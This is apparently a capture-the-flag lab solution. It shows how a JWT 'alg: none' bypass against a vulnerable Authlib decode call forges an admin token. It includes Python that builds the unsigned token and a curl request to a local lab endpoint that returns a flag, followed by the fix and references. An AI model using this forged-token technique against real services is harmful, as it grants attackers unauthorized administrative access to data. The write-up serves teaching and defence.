# Solution - Lab #2: Voiding The Rules

## The Bug

```python
claims = jwt.decode(token, SECRET)
```

Authlib 1.6.6 does not reject tokens where `alg` is `none`. The library decodes the payload without verifying any signature, and the application trusts the resulting `role` claim for authorization.

## Exploit Steps

### 1 - Build the forged token manually

A JWT is three Base64URL-encoded parts separated by dots. With `alg: none`, the third part (signature) is empty but the trailing dot is required.

```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"name": "hacker", "role": "admin"}).encode())
token   = f"{header}.{payload}."
```

Resulting token:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJuYW1lIjoiaGFja2VyIiwicm9sZSI6ImFkbWluIn0.
```

### 2 - Call the admin endpoint

```bash
curl http://localhost:3000/api/admin/data \
  -H "Cookie: session=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJuYW1lIjoiaGFja2VyIiwicm9sZSI6ImFkbWluIn0."
```

Response:

```json
{
  "flag": "FLAG{n0n3_5h411_p455_7h3_n0n3_ch3ck}",
  "employees": [...]
}
```

## Why It Works

- The JWT header is fully attacker-controlled.
- Authlib 1.6.6 does not enforce an algorithm allowlist on `decode()`.
- A `none` token has no signature to forge - the server accepts any claims.
- Authorization is decided entirely by `claims["role"]` after decode.

## Fix

- Upgrade Authlib to a patched version.
- Enforce algorithm allowlist on decode:

```python
claims = jwt.decode(token, SECRET, algorithms=["HS256"])
```

- Reject tokens where `alg` is `none` or missing.
- Never trust an algorithm declared by the client.

## Automated PoC

```bash
pip install requests pwntools
python poc.py
```

The script forges the unsigned token and retrieves the flag without even logging in.

## References

- [Lab: JWT authentication bypass via flawed signature verification (PortSwigger)](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification) - Hands-on lab targeting the alg:none bypass directly
- [GitHub Advisory GHSA-qwph-4952-7xr6 - jsonwebtoken](https://github.com/advisories/GHSA-qwph-4952-7xr6) - Official advisory with PoC conditions and fix details for the npm package
- [JWT Vulnerabilities - HackTricks](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens) - Comprehensive cheatsheet covering alg:none variants and bypass techniques
